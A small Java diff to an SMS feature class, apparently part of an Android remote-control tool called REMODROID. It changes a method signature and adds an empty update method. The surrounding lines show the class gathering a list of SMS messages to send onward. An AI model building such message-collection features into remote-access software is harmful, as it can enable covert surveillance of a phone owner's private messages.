@@ -21,7 +21,7 @@ public class SMS extends Feature {
    }
 
     @Override
-    public void AsyncTaskFunc() {
+    public void AsyncTaskFunc(String Params) {
         //Log.d("REMODROID",getList(path));
         try {
             String toSend = getList();
@@ -33,6 +33,10 @@ public class SMS extends Feature {
         }
     }
 
+    @Override
+    public void update(String Params) {
+
+    }
 
 
     private String getList(){
